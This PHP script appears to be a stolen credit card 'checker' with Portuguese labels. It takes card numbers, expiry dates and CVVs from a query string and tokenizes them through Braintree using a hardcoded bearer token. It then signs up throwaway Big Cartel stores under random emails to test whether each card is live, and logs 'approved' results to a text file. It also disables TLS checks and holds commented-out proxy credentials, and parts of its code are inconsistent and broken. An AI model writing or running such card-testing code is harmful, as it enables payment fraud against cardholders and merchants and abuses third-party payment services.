<?php
error_reporting(0);
set_time_limit(0);

$cookie = 'cookie.txt';

 if (file_exists($cookie)) {
   unlink($cookie);
}

extract($_GET);
function multiexplode ($delimiters,$string) {
    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return  $launch;
}
$lista = $_GET['lista'];
$lista = str_replace("Aprovado  ", "", $lista);
$lista = str_replace("Reprovado  ", "", $lista);
$lista = str_replace("&password=", "", $lista);
$lista = str_replace(" ", "", $lista);
$sep = multiexplode(array(";","=","{senha}:",":","&","|",":"," � "," "),$lista);
$ccn     = $explode[0]; 
$ccm     = $explode[1];
$cca     = $explode[2];
$cvv     = $explode[3];


function GetStr($string,$start,$end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
    }


//https://www.google.com/recaptcha/api2/userverify?k=6Lfh9JgUAAAAAFKjdZEc33SmBBfqqc8hwfFC0X-y


$ch = curl_init();
                  curl_setopt($ch, CURLOPT_URL, "https://my.bigcartel.com/signup/platinum");
                  curl_setopt($ch, CURLOPT_HTTPHEADER, array(                
                      'Content-Type: application/x-www-form-urlencoded', 
                      'Host: my.bigcartel.com',
                      'User-Agent: okhttp/3.4.1' 
                
                ));
                  curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
                  //curl_setopt($ch, CURLOPT_PROXY, 'proxy.apify.com:8000');
                  //curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'auto:zmX59RjjHw5dNwNQFwzeJmyDJ');
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  //curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
                  //curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
                  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                  curl_setopt($ch, CURLOPT_POST, 0);
                  //curl_setopt($ch, CURLOPT_POSTFIELDS, $lust);
                $d0 = curl_exec($ch);

                $csrf = extrair($d0,'<meta name="csrf-token" content="','" />');
            $braint = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"0f36899a-b660-40db-a7f5-8c1208a0ff0b"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":-{"number":"'.$ccn.'","expirationMonth":"'.$ccm.'","expirationYear":"'.$cca.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"92501"}},"options":{"validate":true}}},"operationName":"TokenizeCreditCard"}';
  
            $ch = curl_init();
                  curl_setopt($ch, CURLOPT_URL, "https://payments.braintree-api.com/graphql");
                  curl_setopt($ch, CURLOPT_HTTPHEADER, array(                
                    'Host: payments.braintree-api.com',
                    'Connection: keep-alive',
                    'Content-Length: 604',
                    'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2MDM2ODIyNzAsImp0aSI6IjFmN2ZkOThiLWE2ZjgtNDE1Mi1iZjMzLWEwYjExOWY1MTc1MiIsInN1YiI6InY3bmN2cDVnODljd213d2IiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InY3bmN2cDVnODljd213d2IiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.6pD3_B05hHByR6xD1rIc_YW6flI9JthQ24q-CxAfVWj9d2q4aOYZjUBrVDWfIKVrUhREvoW37Y9WLORK-QQcrg',
                    'Origin: https://assets.braintreegateway.com',
                    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',
                    'Braintree-Version: 2017-12-15',
                    'Content-Type: application/json',
                    'Accept: */*',
                    'Referer: https://assets.braintreegateway.com/web/3.31.0/html/hosted-fields-frame.min.html',
                    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7' 
                
                ));
                  curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
                  //curl_setopt($ch, CURLOPT_PROXY, 'proxy.apify.com:8000');
                  //curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'auto:zmX59RjjHw5dNwNQFwzeJmyDJ');
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
                  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                  curl_setopt($ch, CURLOPT_POST, 1);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, $braint);
                  echo $d1 = curl_exec($ch);

                  $token = extrair($d0,'"token" : "','"');

                  $rand = substr(md5(microtime()),rand(0,26),5);
                  
                  $post  = '{"Form data":{"authenticity_token":"'.$csrf.'","contact_email":"carknh'.$rand.'@gmail.com","password":"Mika'.$rand.'00","store_name":"carknh'.$rand.'s","account_subdomain":"carknh'.$rand.'s","braintree_device_data":"{\"device_session_id\":\"bbdca6c4a8f72bdfbf88528ce3f8bf27\"}","payment_method_nonce":"'.$token.'","payment_method_type":"credit_card"}}';
                  
            $ch = curl_init();
                  curl_setopt($ch, CURLOPT_URL, "https://my.bigcartel.com/signup/platinum");
                  curl_setopt($ch, CURLOPT_HTTPHEADER, array(                
                    'Host: my.bigcartel.com',
                    'Connection: keep-alive',
                    'Content-Length: '.strlen($post).'',
                    'accept: application/json',
                    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',
                    'content-type: application/x-www-form-urlencoded',
                    'Referer: https://my.bigcartel.com/',
                    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
                
                ));
                  curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
                  //curl_setopt($ch, CURLOPT_PROXY, 'proxy.apify.com:8000');
                  //curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'auto:zmX59RjjHw5dNwNQFwzeJmyDJ');
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
                  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                  curl_setopt($ch, CURLOPT_POST, 1);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
                  echo $d3 = curl_exec($ch);

                
      if(strpos($d3, 'aguarde 02 minutos e tente novamente!')) {
       echo "Reprovada $email|$senha | Retorno: Usuario Logado";
       //echo json_encode(array("status" => 1, "str" => ": Reprovada $email | Retorno: Usuario Logado"
   // ));
    }else if(strpos($d3, 'There was a problem verifying your billing zip or postal code.')){
       echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada There was a problem verifying your billing zip or postal code.<i class='zmdi zmdi-close'></i></font> $ccn|$ccm|$cca|$cvv </font><br>";
    }else if(strpos($d3, 'Sair')){
    
        echo "Aprovada $ccn|$ccm|$cca|$cvv | Cvv Correto ";
        $ip = $email;

//Abrir Arquivo TXT para Escrita
$abrir_txt = fopen('tufos.txt', 'a', FALSE);
 fwrite($abrir_txt, "Aprovada: $email|$senha \r\n");

fclose($abrir_txt);
   }else{
     echo json_encode(array("status" => 1, "str" => ": Erro"
    ));
   }
     if(strpos($d2, 'validation_url')) {
                      echo json_encode(array("status" => 1, "str" => '>'
    ));
                       die();
                   } 
          
   

?>
    